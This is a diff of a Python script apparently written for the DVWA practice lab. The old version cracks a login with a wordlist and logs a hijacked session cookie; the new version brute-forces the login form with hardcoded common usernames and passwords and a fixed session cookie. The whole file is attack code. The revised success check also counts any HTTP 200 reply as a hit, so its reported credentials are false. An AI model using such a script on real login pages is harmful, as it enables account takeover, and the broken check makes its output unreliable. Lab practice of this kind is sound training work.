@@ -1,74 +1,42 @@
 import requests
-import logging
 
-# Configure logging
-logging.basicConfig(filename='pentest.log', level=logging.INFO)
+# Adjust the URL to point to the login page of DVWA
+login_url = 'http://127.0.0.1/login.php'
 
-# Configuration
-target_url = 'http://localhost/dvwa/login.php' 
-username = 'admin' 
-wordlist = 'passwords.txt' 
+# Replace with your actual session cookies from DVWA
+cookies = {
+    'PHPSESSID': "b0rbtd9rml9kneq00kt0vofai6",  
+    'security': 'low'  # Ensure the security level matches the one set in DVWA
+}
 
-def login_attempt(username, password):
-    payload = {
-        'username': username,
-        'password': password,
-        'Login': 'Login'  # DVWA's login button name
-    }
-    # Include DVWA's session token in the request if required
-    session = requests.Session()
-    response = session.get(target_url)
-    payload['user_token'] = extract_user_token(response.text)
-    response = session.post(target_url, data=payload)
-    return response
+# List of common usernames and passwords for brute force
+usernames = ['admin', 'administrator', 'root', 'user', 'test']
+passwords = ['password', '123456', 'admin123', 'qwerty', 'password123']
 
-def extract_user_token(html):
-    # Extract the user token from the login page
-    import re
-    match = re.search(r'user_token\' value=\'(.*?)\'', html)
-    if match:
-        return match.group(1)
-    return None
+# Function to perform brute force attack
+def brute_force():
+    print("Performing Brute Force Attack...\n")
+    for username in usernames:
+        for password in passwords:
+            data = {
+                'username': username,
+                'password': password,
+                'Login': 'Login'
+            }
 
-def is_login_successful(response):
-    # Define a success condition based on the response content
-    if 'Welcome' in response.text:  # Modify based on actual success message
-        return True
-    return False
+            try:
+                response = requests.post(login_url, cookies=cookies, data=data, timeout=10)
 
-def password_cracking(username, wordlist):
-    with open(wordlist, 'r') as file:
-        for line in file:
-            password = line.strip()
-            response = login_attempt(username, password)
-            if is_login_successful(response):
-                logging.info(f'Success! Username: {username} | Password: {password}')
-                print(f'Success! Username: {username} | Password: {password}')
-                session_hijacking(response)
-                break
-            else:
-                logging.info(f'Failed attempt. Username: {username} | Password: {password}')
+                # Check response content or status code for login success
+                if 'Welcome to the password protected area admin' in response.text or response.status_code == 200:
+                    print(f"Brute Force successful with username: {username} and password: {password}")
+                    print(f"Credentials Found: Username - {username}, Password - {password}")
+                    return  # Exit function if credentials are found
 
-def session_hijacking(response):
-    session_cookie = response.cookies.get_dict()
-    logging.info(f'Session Hijacked: {session_cookie}')
-    print(f'Session Hijacked: {session_cookie}')
+            except requests.exceptions.RequestException as e:
+                print(f"Error: {e}")
 
-def generate_report():
-    with open('pentest.log', 'r') as log_file:
-        report_content = log_file.read()
-    
-    with open('report.txt', 'w') as report_file:
-        report_file.write('Pentest Report\n')
-        report_file.write('==============\n\n')
-        report_file.write(report_content)
+    print("Brute Force Attack completed. No valid credentials found.")
 
-def main():
-    # Start password cracking
-    password_cracking(username, wordlist)
-    # Generate the report
-    generate_report()
-
-if __name__ == '__main__':
-    main()
-
+# Run brute force attack
+brute_force()
